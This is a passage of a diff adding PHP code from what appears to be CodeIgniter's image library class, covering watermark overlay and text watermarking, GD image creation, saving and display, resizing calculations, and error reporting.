+
+public function overlay_watermark()
+{
+if ( ! function_exists('imagecolortransparent'))
+{
+$this->set_error('imglib_gd_required');
+return FALSE;
+}
+
+$this->get_image_properties();
+
+$props = $this->get_image_properties($this->wm_overlay_path, TRUE);
+$wm_img_type = $props['image_type'];
+$wm_width = $props['width'];
+$wm_height = $props['height'];
+
+$wm_img = $this->image_create_gd($this->wm_overlay_path, $wm_img_type);
+$src_img = $this->image_create_gd($this->full_src_path);
+
+
+
+
+
+
+$this->wm_vrt_alignment = strtoupper($this->wm_vrt_alignment[0]);
+$this->wm_hor_alignment = strtoupper($this->wm_hor_alignment[0]);
+if ($this->wm_vrt_alignment === 'B')
+$this->wm_vrt_offset = $this->wm_vrt_offset * -1;
+if ($this->wm_hor_alignment === 'R')
+$this->wm_hor_offset = $this->wm_hor_offset * -1;
+
+$x_axis = $this->wm_hor_offset + $this->wm_padding;
+$y_axis = $this->wm_vrt_offset + $this->wm_padding;
+
+if ($this->wm_vrt_alignment === 'M')
+{
+$y_axis += ($this->orig_height / 2) - ($wm_height / 2);
+}
+elseif ($this->wm_vrt_alignment === 'B')
+{
+$y_axis += $this->orig_height - $wm_height;
+}
+
+if ($this->wm_hor_alignment === 'C')
+{
+$x_axis += ($this->orig_width / 2) - ($wm_width / 2);
+}
+elseif ($this->wm_hor_alignment === 'R')
+{
+$x_axis += $this->orig_width - $wm_width;
+}
+
+if ($wm_img_type === 3 && function_exists('imagealphablending'))
+{
+@imagealphablending($src_img, TRUE);
+}
+
+$rgba = imagecolorat($wm_img, $this->wm_x_transp, $this->wm_y_transp);
+$alpha = ($rgba & 0x7F000000) >> 24;
+
+if ($alpha > 0)
+{
+
+imagecopy($src_img, $wm_img, $x_axis, $y_axis, 0, 0, $wm_width, $wm_height);
+}
+else
+{
+
+imagecolortransparent($wm_img, imagecolorat($wm_img, $this->wm_x_transp, $this->wm_y_transp));
+imagecopymerge($src_img, $wm_img, $x_axis, $y_axis, 0, 0, $wm_width, $wm_height, $this->wm_opacity);
+}
+
+if ($this->image_type === 3)
+{
+imagealphablending($src_img, FALSE);
+imagesavealpha($src_img, TRUE);
+}
+
+if ($this->dynamic_output === TRUE)
+{
+$this->image_display_gd($src_img);
+}
+elseif ( ! $this->image_save_gd($src_img)) 
+{
+return FALSE;
+}
+imagedestroy($src_img);
+imagedestroy($wm_img);
+return TRUE;
+}
+
+
+
+
+
+
+public function text_watermark()
+{
+if ( ! ($src_img = $this->image_create_gd()))
+{
+return FALSE;
+}
+if ($this->wm_use_truetype === TRUE && ! file_exists($this->wm_font_path))
+{
+$this->set_error('imglib_missing_font');
+return FALSE;
+}
+
+$this->get_image_properties();
+
+
+
+
+
+
+if ($this->wm_vrt_alignment === 'B')
+{
+$this->wm_vrt_offset = $this->wm_vrt_offset * -1;
+}
+if ($this->wm_hor_alignment === 'R')
+{
+$this->wm_hor_offset = $this->wm_hor_offset * -1;
+}
+
+
+
+if ($this->wm_use_truetype === TRUE)
+{
+if (empty($this->wm_font_size))
+{
+$this->wm_font_size = 17;
+}
+if (function_exists('imagettfbbox'))
+{
+$temp = imagettfbbox($this->wm_font_size, 0, $this->wm_font_path, $this->wm_text);
+$temp = $temp[2] - $temp[0];
+$fontwidth = $temp / strlen($this->wm_text);
+}
+else
+{
+$fontwidth = $this->wm_font_size - ($this->wm_font_size / 4);
+}
+$fontheight = $this->wm_font_size;
+$this->wm_vrt_offset += $this->wm_font_size;
+}
+else
+{
+$fontwidth = imagefontwidth($this->wm_font_size);
+$fontheight = imagefontheight($this->wm_font_size);
+}
+
+$x_axis = $this->wm_hor_offset + $this->wm_padding;
+$y_axis = $this->wm_vrt_offset + $this->wm_padding;
+if ($this->wm_use_drop_shadow === FALSE)
+{
+$this->wm_shadow_distance = 0;
+}
+$this->wm_vrt_alignment = strtoupper($this->wm_vrt_alignment[0]);
+$this->wm_hor_alignment = strtoupper($this->wm_hor_alignment[0]);
+
+if ($this->wm_vrt_alignment === 'M')
+{
+$y_axis += ($this->orig_height / 2) + ($fontheight / 2);
+}
+elseif ($this->wm_vrt_alignment === 'B')
+{
+$y_axis += $this->orig_height - $fontheight - $this->wm_shadow_distance - ($fontheight / 2);
+}
+
+if ($this->wm_hor_alignment === 'R')
+{
+$x_axis += $this->orig_width - ($fontwidth * strlen($this->wm_text)) - $this->wm_shadow_distance;
+}
+elseif ($this->wm_hor_alignment === 'C')
+{
+$x_axis += floor(($this->orig_width - ($fontwidth * strlen($this->wm_text))) / 2);
+}
+if ($this->wm_use_drop_shadow)
+{
+
+$x_shad = $x_axis + $this->wm_shadow_distance;
+$y_shad = $y_axis + $this->wm_shadow_distance;
+
+
+
+
+
+
+$drp_color = str_split(substr($this->wm_shadow_color, 1, 6), 2);
+$drp_color = imagecolorclosest($src_img, hexdec($drp_color[0]), hexdec($drp_color[1]), hexdec($drp_color[2]));
+
+if ($this->wm_use_truetype)
+{
+imagettftext($src_img, $this->wm_font_size, 0, $x_shad, $y_shad, $drp_color, $this->wm_font_path, $this->wm_text);
+}
+else
+{
+imagestring($src_img, $this->wm_font_size, $x_shad, $y_shad, $this->wm_text, $drp_color);
+}
+}
+
+
+
+
+
+
+$txt_color = str_split(substr($this->wm_font_color, 1, 6), 2);
+$txt_color = imagecolorclosest($src_img, hexdec($txt_color[0]), hexdec($txt_color[1]), hexdec($txt_color[2]));
+
+if ($this->wm_use_truetype)
+{
+imagettftext($src_img, $this->wm_font_size, 0, $x_axis, $y_axis, $txt_color, $this->wm_font_path, $this->wm_text);
+}
+else
+{
+imagestring($src_img, $this->wm_font_size, $x_axis, $y_axis, $this->wm_text, $txt_color);
+}
+
+if ($this->image_type === 3)
+{
+imagealphablending($src_img, FALSE);
+imagesavealpha($src_img, TRUE);
+}
+
+if ($this->dynamic_output === TRUE)
+{
+$this->image_display_gd($src_img);
+}
+else
+{
+$this->image_save_gd($src_img);
+}
+imagedestroy($src_img);
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function image_create_gd($path = '', $image_type = '')
+{
+if ($path === '')
+{
+$path = $this->full_src_path;
+}
+if ($image_type === '')
+{
+$image_type = $this->image_type;
+}
+switch ($image_type)
+{
+case 1:
+if ( ! function_exists('imagecreatefromgif'))
+{
+$this->set_error(array('imglib_unsupported_imagecreate', 'imglib_gif_not_supported'));
+return FALSE;
+}
+return imagecreatefromgif($path);
+case 2:
+if ( ! function_exists('imagecreatefromjpeg'))
+{
+$this->set_error(array('imglib_unsupported_imagecreate', 'imglib_jpg_not_supported'));
+return FALSE;
+}
+return imagecreatefromjpeg($path);
+case 3:
+if ( ! function_exists('imagecreatefrompng'))
+{
+$this->set_error(array('imglib_unsupported_imagecreate', 'imglib_png_not_supported'));
+return FALSE;
+}
+return imagecreatefrompng($path);
+default:
+$this->set_error(array('imglib_unsupported_imagecreate'));
+return FALSE;
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function image_save_gd($resource)
+{
+switch ($this->image_type)
+{
+case 1:
+if ( ! function_exists('imagegif'))
+{
+$this->set_error(array('imglib_unsupported_imagecreate', 'imglib_gif_not_supported'));
+return FALSE;
+}
+if ( ! @imagegif($resource, $this->full_dst_path))
+{
+$this->set_error('imglib_save_failed');
+return FALSE;
+}
+break;
+case 2:
+if ( ! function_exists('imagejpeg'))
+{
+$this->set_error(array('imglib_unsupported_imagecreate', 'imglib_jpg_not_supported'));
+return FALSE;
+}
+if ( ! @imagejpeg($resource, $this->full_dst_path, $this->quality))
+{
+$this->set_error('imglib_save_failed');
+return FALSE;
+}
+break;
+case 3:
+if ( ! function_exists('imagepng'))
+{
+$this->set_error(array('imglib_unsupported_imagecreate', 'imglib_png_not_supported'));
+return FALSE;
+}
+if ( ! @imagepng($resource, $this->full_dst_path))
+{
+$this->set_error('imglib_save_failed');
+return FALSE;
+}
+break;
+default:
+$this->set_error(array('imglib_unsupported_imagecreate'));
+return FALSE;
+break;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+public function image_display_gd($resource)
+{
+header('Content-Disposition: filename='.$this->source_image.';');
+header('Content-Type: '.$this->mime_type);
+header('Content-Transfer-Encoding: binary');
+header('Last-Modified: '.gmdate('D, d M Y H:i:s', time()).' GMT');
+switch ($this->image_type)
+{
+case 1 : imagegif($resource);
+break;
+case 2 : imagejpeg($resource, NULL, $this->quality);
+break;
+case 3 : imagepng($resource);
+break;
+default: echo 'Unable to display the image';
+break;
+}
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function image_reproportion()
+{
+if (($this->width === 0 && $this->height === 0) OR $this->orig_width === 0 OR $this->orig_height === 0
+OR ( ! ctype_digit((string) $this->width) && ! ctype_digit((string) $this->height))
+OR ! ctype_digit((string) $this->orig_width) OR ! ctype_digit((string) $this->orig_height))
+{
+return;
+}
+
+$this->width = (int) $this->width;
+$this->height = (int) $this->height;
+if ($this->master_dim !== 'width' && $this->master_dim !== 'height')
+{
+if ($this->width > 0 && $this->height > 0)
+{
+$this->master_dim = ((($this->orig_height/$this->orig_width) - ($this->height/$this->width)) < 0)
+? 'width' : 'height';
+}
+else
+{
+$this->master_dim = ($this->height === 0) ? 'width' : 'height';
+}
+}
+elseif (($this->master_dim === 'width' && $this->width === 0)
+OR ($this->master_dim === 'height' && $this->height === 0))
+{
+return;
+}
+if ($this->master_dim === 'width')
+{
+$this->height = (int) ceil($this->width*$this->orig_height/$this->orig_width);
+}
+else
+{
+$this->width = (int) ceil($this->orig_width*$this->height/$this->orig_height);
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function get_image_properties($path = '', $return = FALSE)
+{
+
+
+if ($path === '')
+{
+$path = $this->full_src_path;
+}
+if ( ! file_exists($path))
+{
+$this->set_error('imglib_invalid_path');
+return FALSE;
+}
+$vals = getimagesize($path);
+if ($vals === FALSE)
+{
+$this->set_error('imglib_invalid_image');
+return FALSE;
+}
+$types = array(1 => 'gif', 2 => 'jpeg', 3 => 'png');
+$mime = isset($types[$vals[2]]) ? 'image/'.$types[$vals[2]] : 'image/jpg';
+if ($return === TRUE)
+{
+return array(
+'width' => $vals[0],
+'height' => $vals[1],
+'image_type' => $vals[2],
+'size_str' => $vals[3],
+'mime_type' => $mime
+);
+}
+$this->orig_width = $vals[0];
+$this->orig_height = $vals[1];
+$this->image_type = $vals[2];
+$this->size_str = $vals[3];
+$this->mime_type = $mime;
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function size_calculator($vals)
+{
+if ( ! is_array($vals))
+{
+return;
+}
+$allowed = array('new_width', 'new_height', 'width', 'height');
+foreach ($allowed as $item)
+{
+if (empty($vals[$item]))
+{
+$vals[$item] = 0;
+}
+}
+if ($vals['width'] === 0 OR $vals['height'] === 0)
+{
+return $vals;
+}
+if ($vals['new_width'] === 0)
+{
+$vals['new_width'] = ceil($vals['width']*$vals['new_height']/$vals['height']);
+}
+elseif ($vals['new_height'] === 0)
+{
+$vals['new_height'] = ceil($vals['new_width']*$vals['height']/$vals['width']);
+}
+return $vals;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function explode_name($source_image)
+{
+$ext = strrchr($source_image, '.');
+$name = ($ext === FALSE) ? $source_image : substr($source_image, 0, -strlen($ext));
+return array('ext' => $ext, 'name' => $name);
+}
+
+
+
+
+
+
+public function gd_loaded()
+{
+if ( ! extension_loaded('gd'))
+{
+
+
+
+return (function_exists('dl') && @dl('gd.so'));
+}
+return TRUE;
+}
+
+
+
+
+
+
+public function gd_version()
+{
+if (function_exists('gd_info'))
+{
+$gd_version = @gd_info();
+return preg_replace('/\D/', '', $gd_version['GD Version']);
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+public function set_error($msg)
+{
+$CI =& get_instance();
+$CI->lang->load('imglib');
+if (is_array($msg))
+{
+foreach ($msg as $val)
+{
+$msg = ($CI->lang->line($val) === FALSE) ? $val : $CI->lang->line($val);
+$this->error_msg[] = $msg;
+log_message('error', $msg);
+}
+}
+else
+{
+$msg = ($CI->lang->line($msg) === FALSE) ? $msg : $CI->lang->line($msg);
+$this->error_msg[] = $msg;
+log_message('error', $msg);
+}
+}
+
+
+
+
+
+
+
+
+public function display_errors($open = '<p>', $close = '</p>')
+{
+return (count($this->error_msg) > 0) ? $open.implode($close.$open, $this->error_msg).$close : '';
+}
+}
